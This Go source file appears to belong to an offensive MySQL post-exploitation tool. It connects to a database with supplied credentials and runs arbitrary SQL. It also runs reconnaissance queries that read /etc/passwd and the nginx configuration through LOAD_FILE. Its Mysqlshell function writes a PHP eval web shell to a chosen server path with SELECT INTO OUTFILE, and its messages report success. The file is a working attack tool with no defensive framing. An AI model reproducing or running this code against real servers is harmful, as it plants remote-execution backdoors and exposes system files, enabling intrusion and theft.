package cmdpackage

import (
	"Rpcon/common"
	"Rpcon/pkg"
	"database/sql"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"log"
)

var (
	mysqread = []string{"SELECT LOAD_FILE('/etc/passwd')", "select user()", "show variables like '%plugins%' ;", "select @@version_compile_os", "SELECT LOAD_FILE('/etc/nginx/nginx.conf' )", "show global variables like 'secure%';", "show variables like '%general%';"}
	isdebug  = true
	key      string
	aaa      string
)

func mysqlcmd() (*sql.DB, error) {
	dns := fmt.Sprintf("%v:%v@(%v:%v)/%v", common.User, common.Password, common.Host, common.Port, common.DBname)
	if isdebug {

	}
	db, err := sql.Open("mysql", dns)
	if err != nil {
		log.Fatal("Open Connection failed:", err.Error())
	}
	db.SetMaxOpenConns(20)
	db.SetMaxIdleConns(10)
	return db, err
}

func Query() {

	db, err := mysqlcmd()
	if err != nil {
		fmt.Println(err)
	}
	if common.Code != "" {
		stmt, err := db.Prepare(common.Code)
		if err != nil {
			log.Fatal("Prepare failed:", err.Error())
		}
		defer stmt.Close()
		//通过Statement执行查询
		rows, err := stmt.Query()
		if err != nil {
			log.Fatal("Query failed:", err.Error())
		}

		//建立一个列数组
		cols, err := rows.Columns()
		var colsdata = make([]interface{}, len(cols))
		for i := 0; i < len(cols); i++ {
			colsdata[i] = new(interface{})
			fmt.Print(cols[i])
			fmt.Print("\t")
		}
		fmt.Println()

		//遍历每一行
		for rows.Next() {
			rows.Scan(colsdata...) //将查到的数据写入到这行中
			pkg.PrintRow(colsdata) //打印此行
		}
		defer rows.Close()
		defer func() { db.Close() }()
	}
}

func Mysqlshell() {
	db, err := mysqlcmd()
	if common.File != "" {
		key, err = pkg.Readfile(common.File)
		if err != nil {
			fmt.Println("打开文件失败")
		}
	} else {
		key = "<?php @eval($_POST[1]);?>"
	}
	path := fmt.Sprintf("select '%s' into outfile '%s';", key, common.Path)
	ss, err := db.Query(path)
	if err != nil {
		fmt.Println("写入shell失败，目标没有写入权限或者文件名相同 请重新确认文件名和路径")
	} else {
		log.Println("写入shell成功")
	}
	for ss.Next() {
		err := ss.Scan(&aaa)
		if err != nil {
			log.Println(err)
		}
		log.Println("写入shell成功")
	}
	defer func() { db.Close() }()
}

func Myconfig() {
	db, err := mysqlcmd()
	if err != nil {
		fmt.Println(err)
	}
	for i, _ := range mysqread {
		stmt, err := db.Prepare(mysqread[i])
		if err != nil {
			log.Fatal("Prepare failed:", err.Error())
		}
		defer stmt.Close()
		//通过Statement执行查询
		rows, err := stmt.Query()
		if err != nil {
			log.Fatal("Query failed:", err.Error())
		}

		//建立一个列数组
		cols, err := rows.Columns()
		var colsdata = make([]interface{}, len(cols))
		for i := 0; i < len(cols); i++ {
			colsdata[i] = new(interface{})
			fmt.Print(cols[i])
			fmt.Print("\t")
		}
		fmt.Println()

		//遍历每一行
		for rows.Next() {
			rows.Scan(colsdata...) //将查到的数据写入到这行中
			pkg.PrintRow(colsdata) //打印此行
		}
		defer rows.Close()
	}
	defer func() { db.Close() }()
}
